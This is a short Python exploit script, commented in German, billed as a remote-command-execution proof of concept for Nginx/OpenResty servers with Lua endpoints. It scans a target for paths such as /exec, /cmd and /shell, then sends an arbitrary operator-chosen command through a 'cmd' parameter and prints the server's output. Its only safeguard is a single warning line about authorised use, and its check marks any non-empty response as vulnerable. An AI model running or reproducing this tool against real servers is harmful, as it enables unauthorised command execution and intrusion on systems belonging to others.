#!/usr/bin/env python3
# nginx_lua_rce.py
# für OpenResty / Nginx + Lua

import requests
import argparse
import sys
import urllib.parse

parser = argparse.ArgumentParser(description="Nginx + ngx_http_lua_module RCE PoC")
parser.add_argument('-u', '--url', required=True, help='Target base URL (z.B. http://192.168.1.100:8080)')
parser.add_argument('-c', '--cmd', required=True, help='Befehl, der ausgeführt werden soll')
parser.add_argument('--check', action='store_true', help='Nur prüfen, ob Location existiert')

args = parser.parse_args()

# Trim trailing slash
base_url = args.url.rstrip('/')

# Typische gefährliche Locations (viele davon in der Wild zu finden)
locations = [
    '/exec', '/run', '/cmd', '/lua', '/debug', '/test',
    '/admin/lua', '/api/exec', '/tools/run', '/shell'
]

def check_vulnerable():
    print("[*] Suche nach offenen Lua-Locations...")
    for loc in locations:
        test_url = f"{base_url}{loc}?cmd=id"
        try:
            r = requests.get(test_url, timeout=7, verify=False)
            if r.status_code == 200 and ("uid=" in r.text or "gid=" in r.text or len(r.text.strip()) > 0):
                print(f"[+] VULNERABEL! → {base_url}{loc}")
                return f"{base_url}{loc}"
        except:
            pass
    print("[-] Keine bekannte Lua-Location gefunden")
    return None

def exploit(url, cmd):
    target = f"{url}?cmd={urllib.parse.quote(cmd)}"
    try:
        print(f"[+] Sende: {cmd}")
        r = requests.get(target, timeout=15, verify=False)
        if r.status_code == 200:
            print("[+] Ausgabe:")
            print(r.text.strip() if r.text.strip() else "[keine Ausgabe]")
        else:
            print(f"[-] HTTP {r.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Fehler: {e}")

def main():
    print("Nginx Lua RCE Exploit – OpenResty Edition")
    print("─" * 50)

    if args.check:
        check_vulnerable()
        sys.exit(0)

    # Wenn keine spezifische Location angegeben → versuche Standard
    target_url = base_url + "/exec"  # die häufigste

    print(f"[*] Ziel: {target_url}?cmd=...")
    exploit(target_url, args.cmd)

    # Bonus: auch andere gängige Locations probieren
    for loc in locations[1:]:
        try:
            test = requests.get(f"{base_url}{loc}?cmd=id", timeout=3, verify=False)
            if test.status_code == 200 and len(test.text.strip()) > 0:
                print(f"\n[+] Alternative Location funktioniert: {base_url}{loc}")
                exploit(f"{base_url}{loc}", args.cmd)
        except:
            pass

if __name__ == "__main__":
    # Kleine Warnung
    print("\033[91mWARNUNG: Nur gegen eigene oder autorisierte Systeme verwenden!\033[0m")
    main()
